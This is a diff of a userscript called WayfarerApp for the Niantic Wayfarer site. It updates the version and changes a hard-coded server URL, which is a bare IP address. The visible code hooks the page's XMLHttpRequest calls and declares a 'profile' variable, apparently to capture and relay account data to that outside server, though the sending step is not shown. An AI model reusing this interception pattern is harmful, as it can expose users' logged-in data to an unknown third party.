@@ -1,7 +1,7 @@
 // ==UserScript==
 // @name        WayfarerApp
 // @namespace   example
-// @version     1.3
+// @version     1.3.1
 // @description WayfarerApp
 // @match       https://wayfarer.nianticlabs.com/*
 // @downloadURL https://github.com/davidgamings/wayfarer/raw/main/wayfarer.user.js
@@ -12,7 +12,7 @@
 // ==/UserScript==
 
 (() => {
-    const url = 'https://194.163.159.154:81';
+    const url = 'https://194.163.159.154';
     let profile = null;
     (function (open) {
         XMLHttpRequest.prototype.open = function (method, url) {
